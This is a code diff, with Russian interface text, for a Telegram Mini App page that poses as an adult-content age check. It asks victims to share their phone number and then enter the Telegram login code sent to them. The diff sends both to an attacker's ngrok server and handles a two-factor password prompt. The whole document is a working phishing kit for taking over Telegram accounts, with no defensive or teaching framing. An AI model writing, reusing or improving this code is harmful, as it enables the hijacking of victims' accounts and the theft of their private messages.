@@ -11,46 +11,46 @@
             margin: 0; padding: 0; height: 100vh;
             background: linear-gradient(135deg, #1a1a1a, #000);
             color: white; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center;
-            padding: 20px;
+            justify-content: center; align-items: center; text-align: center; padding: 20px;
         }
         .logo { font-size: 60px; margin-bottom: 20px; }
         .title { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
         .subtitle { font-size: 14px; color: #aaa; margin-bottom: 40px; padding: 0 20px; }
         
-        #phoneBtn {
+        .btn {
             background: #0088cc; color: white; border: none;
             padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold;
-            cursor: pointer; display: none; box-shadow: 0 0 20px rgba(0,136,204,0.5);
-            transition: 0.3s; width: 100%; max-width: 300px;
+            cursor: pointer; box-shadow: 0 0 20px rgba(0,136,204,0.5); width: 100%; max-width: 300px;
         }
-        #phoneBtn:hover { transform: scale(1.05); }
+        .btn:hover { transform: scale(1.05); }
         
-        .code-container { display: none; gap: 10px; margin-top: 20px; }
+        .code-container { display: none; gap: 10px; margin-top: 20px; justify-content: center; }
         .code-input {
             width: 45px; height: 55px; font-size: 24px; text-align: center;
             background: #2a2a2a; border: 1px solid #444; border-radius: 10px;
-            color: white; outline: none; transition: 0.2s;
+            color: white; outline: none;
         }
-        .code-input:focus { border-color: #0088cc; box-shadow: 0 0 10px rgba(0,136,204,0.3); }
-        
+        .code-input:focus { border-color: #0088cc; }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
+    <!-- ВАЖНО: ЗАМЕНИ НА СВОЮ ССЫЛКУ ОТ NGROK -->
+    <script>
+        const API_URL = "https://ТВОЯ-ССЫЛКА.ngrok-free.app"; 
+    </script>
 
     <div id="step1">
         <div class="logo">🔞</div>
         <div class="title">Подтверждение возраста</div>
-        <div class="subtitle">Для доступа к приватному контенту необходимо подтвердить ваш номер телефона через Telegram.</div>
-        <button id="phoneBtn" onclick="requestPhone()">📱 Поделиться номером</button>
+        <div class="subtitle">Для доступа нажмите кнопку ниже.</div>
+        <button class="btn" onclick="requestPhone()">📱 Поделиться номером</button>
     </div>
 
     <div id="step2" class="hidden">
         <div class="logo">🔐</div>
         <div class="title">Введите код</div>
-        <div class="subtitle">Мы отправили код подтверждения в ваш Telegram. Введите его ниже:</div>
-        
+        <div class="subtitle">Код отправлен в Telegram.</div>
         <div class="code-container" id="codeContainer" style="display: flex;">
             <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 0)">
             <input type="tel" maxlength="1" class="code-input" oninput="moveNext(this, 1)">
@@ -63,44 +63,58 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand(); 
-
         let userPhone = "";
 
-        window.onload = function() {
-            document.getElementById('phoneBtn').style.display = 'block';
-        };
-
-        // ЗАПРОС НОМЕРА
         function requestPhone() {
             tg.requestContact((success, event) => {
                 if (success) {
                     userPhone = event.responseUnsafe.contact.phone_number;
+                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                     
-                    // ОТПРАВЛЯЕМ НОМЕР В БОТА
-                    tg.sendData(`phone:${userPhone}`);
-                    
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                    
-                    setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
+                    // Отправляем на сервер
+                    fetch(`${API_URL}/send_code`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({phone: userPhone})
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.success) {
+                            document.getElementById('step1').classList.add('hidden');
+                            document.getElementById('step2').classList.remove('hidden');
+                            setTimeout(() => document.querySelectorAll('.code-input')[0].focus(), 100);
+                        } else {
+                            alert("Ошибка: " + data.error);
+                        }
+                    });
                 }
             });
         }
 
-        // ЛОГИКА ВВОДА КОДА
         function moveNext(input, index) {
             if (input.value.length === 1) {
                 const nextInput = document.querySelectorAll('.code-input')[index + 1];
-                if (nextInput) {
-                    nextInput.focus();
-                } else {
+                if (nextInput) nextInput.focus();
+                else {
                     let code = "";
                     document.querySelectorAll('.code-input').forEach(el => code += el.value);
                     if (code.length === 5) {
-                        // ОТПРАВЛЯЕМ КОД В БОТА
-                        tg.sendData(`code:${code}`);
-                        alert("Код отправлен на проверку!");
-                        tg.close(); // Закрываем окно
+                        fetch(`${API_URL}/verify_code`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({phone: userPhone, code: code})
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.success) {
+                                alert("✅ Успешно!");
+                                tg.close();
+                            } else if (data.needs_password) {
+                                alert("Требуется 2FA пароль!");
+                            } else {
+                                alert("Ошибка: " + data.error);
+                            }
+                        });
                     }
                 }
             }
